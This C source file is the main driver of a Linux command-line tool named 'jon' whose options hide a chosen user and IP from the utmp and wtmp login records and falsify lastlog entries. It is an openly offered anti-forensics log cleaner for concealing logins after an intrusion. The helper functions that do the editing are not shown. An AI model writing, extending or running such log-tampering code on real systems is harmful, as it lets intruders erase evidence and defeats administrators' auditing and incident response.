/*****************************************************************
  * jon version 0.1 Author : Jon Gates < 2182619@qq.com >
  * Date : 2003/10/27
  ******************************************************************/
#ifdef HAVE_CONFIG_H
# include "config.h"
#endif
#include <stdio.h>
#include "jon.h"
#include "loginLog.h"
#include "rewrite_time.h"
#include "str2time.h"

#ifdef HAVE_SYS_TYPES_H
# include <sys/types.h>
#endif
#ifdef HAVE_SYS_STAT_H
# include <sys/stat.h>
#endif
#ifdef STDC_HEADERS
# include <stdlib.h>
# include <stddef.h>
#else
# ifdef HAVE_STDLIB_H
#  include <stdlib.h>
# endif
#endif
#ifdef HAVE_STRING_H
# if !defined STDC_HEADERS && defined HAVE_MEMORY_H
#  include <memory.h>
# endif
# include <string.h>
#endif
#ifdef HAVE_STRINGS_H
# include <strings.h>
#endif

#include <errno.h>
#include <time.h>
#include <unistd.h>
#include <utime.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <pwd.h>
#include <lastlog.h>

#ifdef HAVE_UTMPX_H
# include <utmpx.h>
#else
# ifdef HAVE_UTMP_H
#  include <utmp.h>
# endif
#endif


/*Help info*/
void usage(void){
	printf("%s v %s for linux\n",PACKAGE,PACKAGE_VERSION);
	printf("Copyright (C) 2015 by %s <%s>\n\n",PACKAGE_TARNAME,PACKAGE_BUGREPORT);

	printf("Usage:\n");
	printf("%s [-f utmpfile] -u username ip		hide username from ip in utmp file\n",PACKAGE);
	printf("%s [-f wtmpfile] -w username ip		hide username from ip in wtmp file\n",PACKAGE);
	printf("%s [-f lastlogfile] -m username ip ttyname YYYY[:MM[:DD[:hh[:mm[:ss]]]]]	modify lastlog info\n",PACKAGE);
}

int main(int argc,char **argv){
	char *username = NULL;
	char *ip = NULL;
	char *ttyname  = NULL;
	char *str_time = NULL;
	char *filename = NULL;
	int ch,ret;
	int lflag = 0,uflag = 0,wflag = 0,mflag = 0;
	while((ch = getopt(argc,argv,"l:f:uwm"))!= EOF){
		switch(ch){
			case 'f': 	/*set file*/
				filename = optarg;
				break;
			case 'l': 	/*listLogInfo*/
				lflag = 1;
				break;
			case 'u': 	/*hide utmp User*/
				uflag = 1;
				break;
			case 'w': 	/*hide wtmp User*/
				wflag = 1;
				break;
			case 'm': 	/*mod last info of login */
				mflag = 1;
				break;
			default:
				usage();
				exit(1);
		}
	}
	if(!(lflag||uflag||mflag||wflag)){
		usage();
	}
	if(lflag){
		ret = listLogInfo(username);
		if(ret < 0){
			printf("listLogInfo Failed\n!");
			exit(1);
		}
	}else if(uflag){
		if(optind +1 >= argc){
			usage();
			exit(1);
		}
		username = argv[optind];
		ip = argv[optind+1];
		ret = utmpUser(filename,username,ip);
		if(ret < 0){
			printf("Hide utmpUser Failed\n!");
			exit(1);
		}
		//printf("success!\n");
	}else if(wflag){
		username = argv[optind];
		ip = argv[optind+1];
		if(optind +1 >= argc){
			usage();
			exit(1);
		}
		ret = wtmpUser(filename,username,ip);
		if(ret < 0){
			printf("Hide wtmpUser Failed\n!");
			exit(1);
		}
		//printf("success!\n");
	}else if(mflag){
		if(optind +3 >= argc){
			usage();
			exit(1);
		}
		username = argv[optind];
		ip = argv[optind+1];
		ttyname  = argv[optind+2];
		str_time = argv[optind+3];
		ret = modLastLog(filename,username,ip,ttyname,str_time);
		if(ret < 0){
			printf("Modify Lastlog Failed\n!");
			exit(1);
		}
		//printf("success!\n");
	}
	return 0;
}